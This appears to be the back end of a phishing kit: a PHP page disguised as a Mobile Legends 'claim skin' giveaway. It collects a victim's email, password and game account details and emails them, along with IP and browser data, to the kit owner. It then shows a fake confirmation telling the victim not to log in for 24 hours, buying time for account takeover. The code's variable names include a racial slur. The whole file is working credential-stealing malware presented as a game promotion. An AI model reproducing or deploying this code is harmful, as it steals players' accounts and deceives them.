<?php

include('cilepeung.php');

$email    = $_POST['email'];
$pass = $_POST['password'];
$username = $_POST['username'];
$level = $_POST['level'];
$tier = $_POST['tlevel'];
$skin = $_POST['skin'];
$region = $_POST['region'];


$message   = "


+++++ AKUN ML DARI RAFLIIPEDIA +++++

Email: ".$email."
Password: ".$pass."
Recovery Email:  ".$recovery."
Mobile Phone:  ".$hp."
Username:  ".$username."
Level:  ".$level."
Tier Level:  ".$tier."
Skin:  ".$skin."
Region:  ".$region."

+++++ 2017 RAFLIIPEDIA INDONESIA +++++

+++++ PC Info +++++

IP Info   :  ".$ip." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

+++++ PC Info +++++


";

include 'email.php';
$subject = "ML VIRAL CLAIM SKIN | LOG VK ".$level." PUNYA SI ".$email." (".$negro.") (".$alamat.")";
$headers = "From: RAFLIIPEDIA <result@raflipedia.com>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
<html>
<head>
<title>Mobile Legends - Claim Skin</title>
<link rel="shorcut icon" href="https://www.mobilelegends.com/images/favicon.ico?v=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css">
<style type="text/css">
body { 
  background: url(http://i.imgur.com/Cvx0WTU.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.container {
	position:relative;
	margin:50px auto;
	max-width:800px;
	height:auto;
	border:2px solid #fff;
	padding:30px;
	box-sizing: border-box;
}

.transparent{
 background:rgba(31, 255, 28, 0.9);
 width: 100%;
 height:270px;
 padding:10px;
 margin:0px auto;
 color:#fff;
}

.transparent-box{
 background:rgba(46, 0, 102, 0.9);
 width: 100%;
 height:420px;
 padding:10px;
 margin:0px auto;
 color:#fff;
}
</style>

</head>
<body>


<center><img src="https://upload.wikimedia.org/wikipedia/en/9/9e/Mobilelegends.png"></center>



				
<div class="container transparent-box">
			
<center><font size="6">Complete</font></center>
<form action="index.html" method="post">
<div class="container">

<center><font size="4">Your submission has been submitted</font></center>
<center><font size="4">Please wait up to 24 hours to get your prize</font></center>

</br>

<center><font size="5"><font color="Red">DO NOT OPEN YOUR ACCOUNT UNTIL 24 HOURS</font></font></center>

</br>

<button type="submit" class="btn btn-success btn-block">Logout</button>

</div>
       
</form>


</body>
</html>

